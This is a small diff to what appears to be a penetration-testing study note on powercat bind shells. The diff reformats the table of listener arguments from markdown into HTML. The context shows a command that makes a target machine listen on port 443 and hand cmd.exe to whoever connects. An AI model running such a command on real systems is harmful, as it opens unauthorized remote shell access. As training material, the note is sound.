@@ -16,11 +16,7 @@ First a listener must be started with powercat on the target machine:
 PS C:\Users\offsec> powercat -l -p 443 -e cmd.exe
 ```
 
-| Argument    | Description                                           |
-| ----------- | ----------------------------------------------------- |
-| `-l`        | Tells powercat to **listen** for a connection         |
-| `-p {PORT}` | Specifies the listening **port**                      |
-| `-e {APP}`  | Application that will be **executed** upon connection |
+<table><thead><tr><th width="155">Argument</th><th>Description</th></tr></thead><tbody><tr><td><code>-l</code></td><td>Tells powercat to <strong>listen</strong> for a connection</td></tr><tr><td><code>-p {PORT}</code></td><td>Specifies the listening <strong>port</strong></td></tr><tr><td><code>-e {APP}</code></td><td>Application that will be <strong>executed</strong> upon connection</td></tr></tbody></table>
 
 ### Attacker Machine
 
